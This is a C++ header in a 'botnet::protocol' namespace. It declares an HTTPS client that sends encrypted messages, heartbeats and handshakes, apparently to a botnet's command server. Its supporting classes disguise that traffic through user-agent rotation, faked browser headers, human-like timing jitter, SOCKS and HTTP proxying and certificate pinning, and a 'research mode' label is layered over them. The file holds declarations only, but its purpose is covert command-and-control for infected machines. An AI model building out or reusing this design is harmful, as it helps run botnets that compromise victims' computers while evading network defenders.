#pragma once

#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <boost/beast/ssl.hpp>
#include <string>
#include <map>
#include <vector>
#include <memory>
#include <random>
#include <chrono>
#include "message.h"
#include "crypto/encryption.h"

namespace botnet {
namespace protocol {

/**
 * @brief Cross-platform HTTPS client with traffic obfuscation
 * 
 * Single implementation using Boost.Beast that works identically
 * on Windows, Linux, and macOS. No platform-specific code.
 */
class HTTPSClient {
public:
    struct RequestConfig {
        std::string method = "POST";
        std::string path = "/api/v1/";
        std::map<std::string, std::string> headers;
        std::string content_type = "application/json";
        std::chrono::seconds timeout = std::chrono::seconds(30);
        bool verify_ssl = true;
        bool follow_redirects = true;
        uint32_t max_redirects = 5;
    };

    struct Response {
        uint32_t status_code;
        std::string status_message;
        std::map<std::string, std::string> headers;
        std::string body;
        std::chrono::milliseconds response_time;
        bool success;
        std::string error_message;
    };

public:
    explicit HTTPSClient(boost::asio::io_context& io_context);
    ~HTTPSClient();

    // Connection management
    bool Connect(const std::string& host, uint16_t port = 443);
    void Disconnect();
    bool IsConnected() const;

    // Request methods
    Response SendRequest(const RequestConfig& config, const std::string& body = "");
    Response GET(const std::string& path, const std::map<std::string, std::string>& headers = {});
    Response POST(const std::string& path, const std::string& body, 
                 const std::map<std::string, std::string>& headers = {});
    Response PUT(const std::string& path, const std::string& body,
                const std::map<std::string, std::string>& headers = {});

    // Message-specific methods
    Response SendMessage(const Message& message, const crypto::AESEncryption& encryption);
    Response SendHeartbeat(const HeartbeatMessage& heartbeat);
    Response SendHandshake(const HandshakeRequest& handshake);

    // Configuration
    void SetDefaultHeaders(const std::map<std::string, std::string>& headers);
    void SetTimeout(std::chrono::seconds timeout);
    void SetSSLVerification(bool enabled);
    void SetProxySettings(const std::string& host, uint16_t port, 
                         const std::string& username = "", 
                         const std::string& password = "");

    // Traffic obfuscation
    void EnableTrafficObfuscation(bool enabled);
    void SetUserAgentRotation(bool enabled);
    void SetHeaderMimicking(bool enabled);
    void SetTimingJitter(bool enabled);
    void AddUserAgent(const std::string& user_agent);
    void SetResearchMode(bool enabled);

    // Statistics
    struct ConnectionStats {
        uint32_t total_requests;
        uint32_t successful_requests;
        uint32_t failed_requests;
        std::chrono::milliseconds average_response_time;
        uint64_t bytes_sent;
        uint64_t bytes_received;
        std::chrono::system_clock::time_point last_request;
    };

    ConnectionStats GetStats() const;
    void ResetStats();

private:
    using tcp = boost::asio::ip::tcp;
    using ssl_stream = boost::beast::ssl_stream<boost::beast::tcp_stream>;

    boost::asio::io_context& io_context_;
    std::unique_ptr<ssl_stream> stream_;
    boost::asio::ssl::context ssl_context_;
    tcp::resolver resolver_;

    // Connection state
    std::string host_;
    uint16_t port_;
    bool connected_;

    // Configuration
    std::map<std::string, std::string> default_headers_;
    std::chrono::seconds default_timeout_{30};
    bool verify_ssl_{true};
    
    // Proxy settings
    std::string proxy_host_;
    uint16_t proxy_port_{0};
    std::string proxy_username_;
    std::string proxy_password_;

    // Traffic obfuscation
    bool obfuscation_enabled_{true};
    bool user_agent_rotation_{true};
    bool header_mimicking_{true};
    bool timing_jitter_{true};
    bool research_mode_{false};

    // User agent pool for rotation
    std::vector<std::string> user_agents_;
    mutable std::mt19937 rng_;
    std::uniform_int_distribution<size_t> user_agent_dist_;

    // Statistics
    mutable std::mutex stats_mutex_;
    ConnectionStats stats_{};

    // Internal methods
    Response ExecuteRequest(const RequestConfig& config, const std::string& body);
    boost::beast::http::request<boost::beast::http::string_body> 
        CreateRequest(const RequestConfig& config, const std::string& body);
    
    void ApplyTrafficObfuscation(boost::beast::http::request<boost::beast::http::string_body>& request);
    std::string GetRandomUserAgent() const;
    std::map<std::string, std::string> GetMimickedHeaders() const;
    void AddTimingJitter() const;
    
    void UpdateStats(bool success, std::chrono::milliseconds response_time, 
                    size_t bytes_sent, size_t bytes_received);
    
    void InitializeDefaultUserAgents();
    void InitializeSSLContext();
    
    bool ConnectToHost();
    bool PerformSSLHandshake();
    
    // Research logging
    mutable std::vector<std::string> research_log_;
    void LogResearchActivity(const std::string& activity) const;
};

/**
 * @brief User agent rotation manager
 */
class UserAgentManager {
public:
    UserAgentManager();
    
    std::string GetRandomUserAgent() const;
    void AddUserAgent(const std::string& user_agent);
    void SetResearchMode(bool enabled);
    std::string GetResearchUserAgent() const;
    
    // Predefined user agent categories
    void LoadWindowsUserAgents();
    void LoadLinuxUserAgents();
    void LoadMacOSUserAgents();
    void LoadMobileUserAgents();

private:
    mutable std::vector<std::string> user_agents_;
    mutable std::mt19937 rng_;
    bool research_mode_{false};
    
    static const std::vector<std::string> DEFAULT_WINDOWS_USER_AGENTS;
    static const std::vector<std::string> DEFAULT_LINUX_USER_AGENTS;
    static const std::vector<std::string> DEFAULT_MACOS_USER_AGENTS;
    static const std::vector<std::string> RESEARCH_USER_AGENTS;
};

/**
 * @brief HTTP header mimicking for traffic obfuscation
 */
class HeaderMimicker {
public:
    HeaderMimicker();
    
    std::map<std::string, std::string> GenerateNormalBrowserHeaders() const;
    std::map<std::string, std::string> GenerateAPIClientHeaders() const;
    std::map<std::string, std::string> GenerateResearchHeaders() const;
    
    void SetResearchMode(bool enabled);
    
    // Specific header generators
    std::string GenerateAcceptHeader() const;
    std::string GenerateAcceptLanguageHeader() const;
    std::string GenerateAcceptEncodingHeader() const;
    std::string GenerateDNTHeader() const;
    std::string GenerateConnectionHeader() const;

private:
    bool research_mode_{false};
    mutable std::mt19937 rng_;
    
    static const std::vector<std::string> ACCEPT_HEADERS;
    static const std::vector<std::string> ACCEPT_LANGUAGE_HEADERS;
    static const std::vector<std::string> ACCEPT_ENCODING_HEADERS;
};

/**
 * @brief Timing jitter for request spacing
 */
class TimingJitter {
public:
    TimingJitter();
    
    void AddJitter(std::chrono::milliseconds base_delay = std::chrono::milliseconds(0)) const;
    std::chrono::milliseconds GetJitteredInterval(std::chrono::seconds base_interval) const;
    
    void SetJitterRange(std::chrono::milliseconds min_jitter, 
                       std::chrono::milliseconds max_jitter);
    void SetResearchMode(bool enabled);
    
    // Human-like timing patterns
    std::chrono::milliseconds GetHumanLikeDelay() const;
    std::chrono::milliseconds GetBusinessHoursDelay() const;
    std::chrono::milliseconds GetOffHoursDelay() const;

private:
    mutable std::mt19937 rng_;
    std::chrono::milliseconds min_jitter_{50};
    std::chrono::milliseconds max_jitter_{500};
    bool research_mode_{false};
    
    bool IsBusinessHours() const;
};

/**
 * @brief HTTP proxy support
 */
class ProxyHandler {
public:
    enum class ProxyType {
        HTTP,
        HTTPS,
        SOCKS4,
        SOCKS5
    };

    struct ProxyConfig {
        ProxyType type;
        std::string host;
        uint16_t port;
        std::string username;
        std::string password;
        bool enabled;
    };

public:
    ProxyHandler();
    
    void SetProxyConfig(const ProxyConfig& config);
    bool ConnectThroughProxy(boost::asio::ip::tcp::socket& socket, 
                           const std::string& target_host, 
                           uint16_t target_port);
    
    boost::beast::http::request<boost::beast::http::string_body> 
        ApplyProxyHeaders(boost::beast::http::request<boost::beast::http::string_body> request) const;

private:
    ProxyConfig config_;
    
    bool ConnectHTTPProxy(boost::asio::ip::tcp::socket& socket, 
                         const std::string& target_host, 
                         uint16_t target_port);
    bool ConnectSOCKS5Proxy(boost::asio::ip::tcp::socket& socket, 
                           const std::string& target_host, 
                           uint16_t target_port);
    
    std::string CreateProxyAuthHeader() const;
};

/**
 * @brief Cookie manager for session handling
 */
class CookieManager {
public:
    struct Cookie {
        std::string name;
        std::string value;
        std::string domain;
        std::string path;
        std::chrono::system_clock::time_point expires;
        bool secure;
        bool http_only;
        bool session_cookie;
    };

public:
    CookieManager();
    
    void StoreCookies(const std::map<std::string, std::string>& response_headers, 
                     const std::string& domain);
    std::string GetCookieHeader(const std::string& domain, const std::string& path) const;
    
    void ClearCookies();
    void ClearExpiredCookies();
    
    std::vector<Cookie> GetAllCookies() const;

private:
    std::vector<Cookie> cookies_;
    mutable std::mutex cookies_mutex_;
    
    Cookie ParseCookieFromSetCookieHeader(const std::string& set_cookie_header, 
                                         const std::string& domain) const;
    bool CookieMatchesDomainAndPath(const Cookie& cookie, 
                                   const std::string& domain, 
                                   const std::string& path) const;
};

/**
 * @brief SSL/TLS certificate manager
 */
class CertificateManager {
public:
    CertificateManager();
    
    void SetCertificateVerification(bool enabled);
    void AddTrustedCertificate(const std::string& cert_pem);
    void SetCertificatePinning(const std::vector<std::string>& pinned_fingerprints);
    
    bool VerifyCertificate(const std::string& hostname, X509* cert) const;
    std::string GetCertificateFingerprint(X509* cert) const;
    
    void EnableResearchMode(bool enabled);
    void LogCertificateInfo(X509* cert) const;

private:
    bool verification_enabled_{true};
    std::vector<std::string> trusted_certificates_;
    std::vector<std::string> pinned_fingerprints_;
    bool research_mode_{false};
    
    mutable std::vector<std::string> research_log_;
    
    void LogResearchActivity(const std::string& activity) const;
};

} // namespace protocol
} // namespace botnet
